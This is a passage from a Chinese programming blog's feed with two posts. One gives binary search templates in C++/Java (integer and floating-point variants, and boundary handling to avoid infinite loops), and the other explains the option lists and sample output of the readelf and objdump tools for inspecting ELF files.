    <published>2021-06-01T12:54:02.000Z</published>
    <updated>2021-06-01T12:54:02.000Z</updated>
    
    <content type="html"><![CDATA[<p>实现二分的两种不同方式，避免陷入死循环。<a id="more"></a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://blog.csdn.net/EbowTang/article/details/50770315">LeetCode总结，二分法一般性总结</a>：证明正确性与应用</li><li><a href="https://www.acwing.com/blog/content/1635/">二分法小结</a></li><li><a href="https://www.acwing.com/blog/content/31/">二分查找算法模板</a></li><li><a href="https://www.zhihu.com/question/36132386">二分查找有几种写法？它们的区别是什么？</a></li><li><a href="https://leetcode-cn.com/problems/search-insert-position/solution/te-bie-hao-yong-de-er-fen-cha-fa-fa-mo-ban-python-/">写对二分查找不能靠模板，需要理解加练习 （附练习题，持续更新）</a></li></ol><h1 id="二分法介绍"><a href="#二分法介绍" class="headerlink" title="二分法介绍"></a>二分法介绍</h1><p><a href="http://en.wikipedia.org/wiki/Binary_search_algorithm">二分查找法</a>主要是解决在“一堆数中找出指定的数”这类问题，这“一堆数”必须有以下特征：</p><ul><li>存储在数组中</li><li>有序排列</li></ul><h3 id="思想"><a href="#思想" class="headerlink" title="思想"></a>思想</h3><p>假设目标值在闭区间[l, r]中， 每次将区间长度缩小一半，当l = r时，我们就找到了目标值。</p><h3 id="二分和单调性的关系"><a href="#二分和单调性的关系" class="headerlink" title="二分和单调性的关系"></a>二分和单调性的关系</h3><p>有单调性的一定可以二分，但可以二分的不一定有单调性，即没有单调性也可以二分。</p><h1 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h1><h2 id="方式"><a href="#方式" class="headerlink" title="方式"></a>方式</h2><h3 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch</span><span class="params">(<span class="keyword">int</span> array[], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (low &gt; high) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">int</span> mid = (low + high)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span> (array[mid]&gt; target)</span><br><span class="line">        <span class="keyword">return</span>    binarysearch(array, low, mid -<span class="number">1</span>, target);</span><br><span class="line">    <span class="keyword">if</span> (array[mid]&lt; target)</span><br><span class="line">        <span class="keyword">return</span>    binarysearch(array, mid+<span class="number">1</span>, high, target);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//if (midValue == target)</span></span><br><span class="line">        <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearchWithoutRecursion</span><span class="params">(<span class="keyword">int</span> array[], <span class="keyword">int</span> low, <span class="keyword">int</span> high, <span class="keyword">int</span> target)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(low &lt;= high)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = (low + high)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (array[mid] &gt; target)</span><br><span class="line">            high = mid - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (array[mid] &lt; target)</span><br><span class="line">            low = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">else</span> <span class="comment">//find the target</span></span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//the array does not contain the target</span></span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="整数二分实现"><a href="#整数二分实现" class="headerlink" title="整数二分实现"></a>整数二分实现</h2><p>需要考虑边界问题，否则会陷入死循环。</p><h3 id="版本1"><a href="#版本1" class="headerlink" title="版本1"></a>版本1</h3><p>当我们将区间[l, r]划分成[l, mid]和[mid + 1, r]时，其更新操作是r = mid或者l = mid + 1;，计算mid时不需要加1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch_1</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l + r &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="版本2"><a href="#版本2" class="headerlink" title="版本2"></a>版本2</h3><p>当我们将区间[l, r]划分成[l, mid - 1]和[mid, r]时，其更新操作是r = mid - 1或者l = mid;，此时为了防止死循环，计算mid时需要加1。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bsearch_2</span><span class="params">(<span class="keyword">int</span> l, <span class="keyword">int</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (l &lt; r)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> mid = l + r + <span class="number">1</span> &gt;&gt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid)) l = mid;</span><br><span class="line">        <span class="keyword">else</span> r = mid - <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="浮点数二分实现"><a href="#浮点数二分实现" class="headerlink" title="浮点数二分实现"></a>浮点数二分实现</h1><p>无需考虑边界问题。</p><ol><li><p>找到一个区间[l, r], 使得答案一定在区间中。</p></li><li><p>找到一个判断条件，使得判断条件具有二段性，并且答案一定是该二段性的分界点。</p></li><li><p>分析中点mid = (l + r) / 2 在该判断条件下是否成立。<br>  如果成立，考虑答案在哪个区间；<br>  如果不成立，考虑答案在哪个区间。</p></li><li><p>确定更新方式r = mid 或 l = mid。</p></li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">check</span><span class="params">(<span class="keyword">double</span> x)</span> </span>&#123;<span class="comment">/* ... */</span>&#125; <span class="comment">// 检查x是否满足某种性质</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">double</span> <span class="title">bsearch_3</span><span class="params">(<span class="keyword">double</span> l, <span class="keyword">double</span> r)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">double</span> eps = <span class="number">1e-6</span>;   <span class="comment">// eps 表示精度，取决于题目对精度的要求</span></span><br><span class="line">    <span class="keyword">while</span> (r - l &gt; eps)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">double</span> mid = (l + r) / <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (check(mid)) r = mid;</span><br><span class="line">        <span class="keyword">else</span> l = mid;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> l;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>关于浮点数二分中区间精度的选取：</p><p>一般来说区间精度为1e-6就很高了。如果要求结果保留4位小数，那么精度可以取1e-6；如果要求结果保留5位小数，那么区间精度可以取1e-7。以此类推……</p><p>简言之，区间精度至少要比要保留的小数位数高2位。</p><h1 id="如何理解"><a href="#如何理解" class="headerlink" title="如何理解"></a>如何理解</h1>]]></content>
    
    
    <summary type="html">&lt;p&gt;实现二分的两种不同方式，避免陷入死循环。&lt;/p&gt;</summary>
    
    
    
    <category term="算法" scheme="https://www.fvolcano.red/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="整理" scheme="https://www.fvolcano.red/tags/%E6%95%B4%E7%90%86/"/>
    
  </entry>
  
  <entry>
    <title>用readelf、objdump分析程序</title>
    <link href="https://www.fvolcano.red/2021/how-to-use-readelf-and-objdump/"/>
    <id>https://www.fvolcano.red/2021/how-to-use-readelf-and-objdump/</id>
    <published>2021-05-31T13:04:28.000Z</published>
    <updated>2021-05-31T13:04:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>整理linux中readelf、objdump工具的用法。</p><a id="more"></a><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ol><li><a href="https://linuxtools-rst.readthedocs.io/zh_CN/latest/tool/readelf.html">readelf elf文件格式分析</a></li><li><a href="https://blog.csdn.net/Roland_Sun/article/details/37581715">ELF文件查看利器之readelf用法</a></li><li><a href="https://www.jianshu.com/p/863b279c941e">使用readelf和objdump解析目标文件</a></li><li><a href="https://ivanzz1001.github.io/records/post/linux/2018/04/09/linux-objdump">Linux中objdump的使用</a></li></ol><h1 id="用法"><a href="#用法" class="headerlink" title="用法"></a>用法</h1><h2 id="readelf"><a href="#readelf" class="headerlink" title="readelf"></a>readelf</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> readelf</span></span><br><span class="line">Usage: readelf &lt;option(s)&gt; elf-file(s)</span><br><span class="line"> Display information about the contents of ELF format files</span><br><span class="line"> Options are:</span><br><span class="line">  -a --all               Equivalent to: -h -l -S -s -r -d -V -A -I</span><br><span class="line">  -h --file-header       Display the ELF file header</span><br><span class="line">  -l --program-headers   Display the program headers</span><br><span class="line">     --segments          An alias for --program-headers</span><br><span class="line">  -S --section-headers   Display the sections&#x27; header</span><br><span class="line">     --sections          An alias for --section-headers</span><br><span class="line">  -g --section-groups    Display the section groups</span><br><span class="line">  -t --section-details   Display the section details</span><br><span class="line">  -e --headers           Equivalent to: -h -l -S</span><br><span class="line">  -s --syms              Display the symbol table</span><br><span class="line">     --symbols           An alias for --syms</span><br><span class="line">  --dyn-syms             Display the dynamic symbol table</span><br><span class="line">  -n --notes             Display the core notes (if present)</span><br><span class="line">  -r --relocs            Display the relocations (if present)</span><br><span class="line">  -u --unwind            Display the unwind info (if present)</span><br><span class="line">  -d --dynamic           Display the dynamic section (if present)</span><br><span class="line">  -V --version-info      Display the version sections (if present)</span><br><span class="line">  -A --arch-specific     Display architecture specific information (if any)</span><br><span class="line">  -c --archive-index     Display the symbol/file index in an archive</span><br><span class="line">  -D --use-dynamic       Use the dynamic section info when displaying symbols</span><br><span class="line">  -x --hex-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as bytes</span><br><span class="line">  -p --string-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as strings</span><br><span class="line">  -R --relocated-dump=&lt;number|name&gt;</span><br><span class="line">                         Dump the contents of section &lt;number|name&gt; as relocated bytes</span><br><span class="line">  -w[lLiaprmfFsoRt] or</span><br><span class="line">  --debug-dump[=rawline,=decodedline,=info,=abbrev,=pubnames,=aranges,=macro,=frames,</span><br><span class="line">               =frames-interp,=str,=loc,=Ranges,=pubtypes,</span><br><span class="line">               =gdb_index,=trace_info,=trace_abbrev,=trace_aranges,</span><br><span class="line">               =addr,=cu_index]</span><br><span class="line">                         Display the contents of DWARF2 debug sections</span><br><span class="line">  --dwarf-depth=N        Do not display DIEs at depth N or greater</span><br><span class="line">  --dwarf-start=N        Display DIEs starting with N, at the same depth</span><br><span class="line">                         or deeper</span><br><span class="line">  -I --histogram         Display histogram of bucket list lengths</span><br><span class="line">  -W --wide              Allow output width to exceed 80 characters</span><br><span class="line">  @&lt;file&gt;                Read options from &lt;file&gt;</span><br><span class="line">  -H --help              Display this information</span><br><span class="line">  -v --version           Display the version number of readelf</span><br></pre></td></tr></table></figure><h2 id="objdump"><a href="#objdump" class="headerlink" title="objdump"></a>objdump</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">objdump [-a|--archive-headers]</span><br><span class="line">   [-b bfdname|--target=bfdname]</span><br><span class="line">   [-C|--demangle[=style] ]</span><br><span class="line">   [-d|--disassemble]</span><br><span class="line">   [-D|--disassemble-all]</span><br><span class="line">   [-z|--disassemble-zeroes]</span><br><span class="line">   [-EB|-EL|--endian=&#123;big | little &#125;]</span><br><span class="line">   [-f|--file-headers]</span><br><span class="line">   [-F|--file-offsets]</span><br><span class="line">   [--file-start-context]</span><br><span class="line">   [-g|--debugging]</span><br><span class="line">   [-e|--debugging-tags]</span><br><span class="line">   [-h|--section-headers|--headers]</span><br><span class="line">   [-i|--info]</span><br><span class="line">   [-j section|--section=section]</span><br><span class="line">   [-l|--line-numbers]</span><br><span class="line">   [-S|--source]</span><br><span class="line">   [-m machine|--architecture=machine]</span><br><span class="line">   [-M options|--disassembler-options=options]</span><br><span class="line">   [-p|--private-headers]</span><br><span class="line">   [-P options|--private=options]</span><br><span class="line">   [-r|--reloc]</span><br><span class="line">   [-R|--dynamic-reloc]</span><br><span class="line">   [-s|--full-contents]</span><br><span class="line">   [-W[lLiaprmfFsoRt]|</span><br><span class="line">    --dwarf[=rawline,=decodedline,=info,=abbrev,=pubnames]</span><br><span class="line">            [=aranges,=macro,=frames,=frames-interp,=str,=loc]</span><br><span class="line">            [=Ranges,=pubtypes,=trace_info,=trace_abbrev]</span><br><span class="line">            [=trace_aranges,=gdb_index]</span><br><span class="line">   [-G|--stabs]</span><br><span class="line">   [-t|--syms]</span><br><span class="line">   [-T|--dynamic-syms]</span><br><span class="line">   [-x|--all-headers]</span><br><span class="line">   [-w|--wide]</span><br><span class="line">   [--start-address=address]</span><br><span class="line">   [--stop-address=address]</span><br><span class="line">   [--prefix-addresses]</span><br><span class="line">   [--[no-]show-raw-insn]</span><br><span class="line">   [--adjust-vma=offset]</span><br><span class="line">   [--special-syms]</span><br><span class="line">   [--prefix=prefix]</span><br><span class="line">   [--prefix-strip=level]</span><br><span class="line">   [--insn-width=width]</span><br><span class="line">   [-V|--version]</span><br><span class="line">   [-H|--help]</span><br><span class="line">   objfile...</span><br></pre></td></tr></table></figure><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"># https://wangchujiang.com/linux-command/c/objdump.html</span><br><span class="line"></span><br><span class="line"><span class="deletion">-a --archive-headers </span></span><br><span class="line"># 显示档案库的成员信息,类似ls -l将lib*.a的信息列出。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-b bfdname --target=bfdname </span></span><br><span class="line"># 指定目标码格式。这不是必须的，objdump能自动识别许多格式，比如： </span><br><span class="line"></span><br><span class="line">objdump -b oasys -m vax -h fu.o </span><br><span class="line"># 显示fu.o的头部摘要信息，明确指出该文件是Vax系统下用Oasys编译器生成的目标文件。objdump -i将给出这里可以指定的目标码格式列表。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-C --demangle </span></span><br><span class="line"># 将底层的符号名解码成用户级名字，除了去掉所开头的下划线之外，还使得C++函数名以可理解的方式显示出来。 </span><br><span class="line"><span class="deletion">--debugging </span></span><br><span class="line"><span class="deletion">-g </span></span><br><span class="line"># 显示调试信息。企图解析保存在文件中的调试信息并以C语言的语法显示出来。仅仅支持某些类型的调试信息。有些其他的格式被readelf -w支持。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-e --debugging-tags </span></span><br><span class="line"># 类似-g选项，但是生成的信息是和ctags工具相兼容的格式。 </span><br><span class="line"><span class="deletion">--disassemble </span></span><br><span class="line"><span class="deletion">-d </span></span><br><span class="line"># 从objfile中反汇编那些特定指令机器码的section。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-D --disassemble-all </span></span><br><span class="line"># 与 -d 类似，但反汇编所有section. </span><br><span class="line"></span><br><span class="line"><span class="deletion">--prefix-addresses </span></span><br><span class="line"># 反汇编的时候，显示每一行的完整地址。这是一种比较老的反汇编格式。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-EB </span></span><br><span class="line"><span class="deletion">-EL </span></span><br><span class="line"><span class="deletion">--endian=&#123;big|little&#125; </span></span><br><span class="line"># 指定目标文件的小端。这个项将影响反汇编出来的指令。在反汇编的文件没描述小端信息的时候用。例如S-records. </span><br><span class="line"></span><br><span class="line"><span class="deletion">-f </span></span><br><span class="line"><span class="deletion">--file-headers </span></span><br><span class="line">显示objfile中每个文件的整体头部摘要信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-h </span></span><br><span class="line"><span class="deletion">--section-headers </span></span><br><span class="line"><span class="deletion">--headers </span></span><br><span class="line">显示目标文件各个section的头部摘要信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-H </span></span><br><span class="line"><span class="deletion">--help </span></span><br><span class="line">简短的帮助信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-i </span></span><br><span class="line"><span class="deletion">--info </span></span><br><span class="line">显示对于 -b 或者 -m 选项可用的架构和目标格式列表。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-j name</span></span><br><span class="line"><span class="deletion">--section=name </span></span><br><span class="line">仅仅显示指定名称为name的section的信息 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-l</span></span><br><span class="line"><span class="deletion">--line-numbers </span></span><br><span class="line">用文件名和行号标注相应的目标代码，仅仅和-d、-D或者-r一起使用使用-ld和使用-d的区别不是很大，在源码级调试的时候有用，要求编译时使用了-g之类的调试编译选项。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-m machine </span></span><br><span class="line"><span class="deletion">--architecture=machine </span></span><br><span class="line">指定反汇编目标文件时使用的架构，当待反汇编文件本身没描述架构信息的时候(比如S-records)，这个选项很有用。可以用-i选项列出这里能够指定的架构. </span><br><span class="line"></span><br><span class="line"><span class="deletion">--reloc </span></span><br><span class="line"><span class="deletion">-r </span></span><br><span class="line">显示文件的重定位入口。如果和-d或者-D一起使用，重定位部分以反汇编后的格式显示出来。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--dynamic-reloc </span></span><br><span class="line"><span class="deletion">-R </span></span><br><span class="line">显示文件的动态重定位入口，仅仅对于动态目标文件意义，比如某些共享库。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-s </span></span><br><span class="line"><span class="deletion">--full-contents </span></span><br><span class="line">显示指定section的完整内容。默认所有的非空section都会被显示。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-S </span></span><br><span class="line"><span class="deletion">--source </span></span><br><span class="line">尽可能反汇编出源代码，尤其当编译的时候指定了-g这种调试参数时，效果比较明显。隐含了-d参数。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--show-raw-insn </span></span><br><span class="line">反汇编的时候，显示每条汇编指令对应的机器码，如不指定--prefix-addresses，这将是缺省选项。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--no-show-raw-insn </span></span><br><span class="line">反汇编时，不显示汇编指令的机器码，如不指定--prefix-addresses，这将是缺省选项。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--start-address=address </span></span><br><span class="line">从指定地址开始显示数据，该选项影响-d、-r和-s选项的输出。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--stop-address=address </span></span><br><span class="line">显示数据直到指定地址为止，该项影响-d、-r和-s选项的输出。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-t </span></span><br><span class="line"><span class="deletion">--syms </span></span><br><span class="line">显示文件的符号表入口。类似于nm -s提供的信息 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-T </span></span><br><span class="line"><span class="deletion">--dynamic-syms </span></span><br><span class="line">显示文件的动态符号表入口，仅仅对动态目标文件意义，比如某些共享库。它显示的信息类似于 nm -D|--dynamic 显示的信息。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-V </span></span><br><span class="line"><span class="deletion">--version </span></span><br><span class="line">版本信息 </span><br><span class="line"></span><br><span class="line"><span class="deletion">--all-headers </span></span><br><span class="line"><span class="deletion">-x </span></span><br><span class="line">显示所可用的头信息，包括符号表、重定位入口。-x 等价于-a -f -h -r -t 同时指定。 </span><br><span class="line"></span><br><span class="line"><span class="deletion">-z </span></span><br><span class="line"><span class="deletion">--disassemble-zeroes </span></span><br><span class="line">一般反汇编输出将省略大块的零，该选项使得这些零块也被反汇编。 </span><br><span class="line"></span><br><span class="line">@file 可以将选项集中到一个文件中，然后使用这个@file选项载入。</span><br></pre></td></tr></table></figure><h1 id="分析程序"><a href="#分析程序" class="headerlink" title="分析程序"></a>分析程序</h1><h2 id="应用程序的可运行的架构平台"><a href="#应用程序的可运行的架构平台" class="headerlink" title="应用程序的可运行的架构平台"></a>应用程序的可运行的架构平台</h2><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ readelf -h main<span class="string">| grep Machine</span></span><br></pre></td></tr></table></figure><p>-h选项将显示文件头的概要信息，从里面可以看到，有很多有用的信息：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">$</span> <span class="string">readelf</span> <span class="string">-h</span> <span class="string">main</span></span><br><span class="line"><span class="attr">ELF Header:</span></span><br><span class="line"><span class="attr">Magic:</span>   <span class="string">7f</span> <span class="number">45</span> <span class="string">4c</span> <span class="number">46</span> <span class="number">02</span> <span class="number">01</span> <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="attr">Class:</span>                             <span class="string">ELF64</span></span><br><span class="line"><span class="attr">Data:</span>                              <span class="number">2</span> <span class="string">s</span> <span class="string">complement,</span> <span class="string">little</span> <span class="string">endian</span></span><br><span class="line"><span class="attr">Version:</span>                           <span class="number">1</span> <span class="string">(current)</span></span><br><span class="line"><span class="attr">OS/ABI:</span>                            <span class="string">UNIX</span> <span class="bullet">-</span> <span class="string">System</span> <span class="string">V</span></span><br><span class="line"><span class="attr">ABI Version:</span>                       <span class="number">0</span></span><br><span class="line"><span class="attr">Type:</span>                              <span class="string">EXEC</span> <span class="string">(Executable</span> <span class="string">file)</span></span><br><span class="line"><span class="attr">Machine:</span>                           <span class="string">Advanced</span> <span class="string">Micro</span> <span class="string">Devices</span> <span class="string">X86-64</span></span><br><span class="line"><span class="attr">Version:</span>                           <span class="number">0x1</span></span><br><span class="line"><span class="attr">Entry point address:</span>               <span class="number">0x400790</span></span><br><span class="line"><span class="attr">Start of program headers:</span>          <span class="number">64</span> <span class="string">(bytes</span> <span class="string">into</span> <span class="string">file)</span></span><br><span class="line"><span class="attr">Start of section headers:</span>          <span class="number">5224</span> <span class="string">(bytes</span> <span class="string">into</span> <span class="string">file)</span></span><br><span class="line"><span class="attr">Flags:</span>                             <span class="number">0x0</span></span><br><span class="line"><span class="attr">Size of this header:</span>               <span class="number">64</span> <span class="string">(bytes)</span></span><br><span class="line"><span class="attr">Size of program headers:</span>           <span class="number">56</span> <span 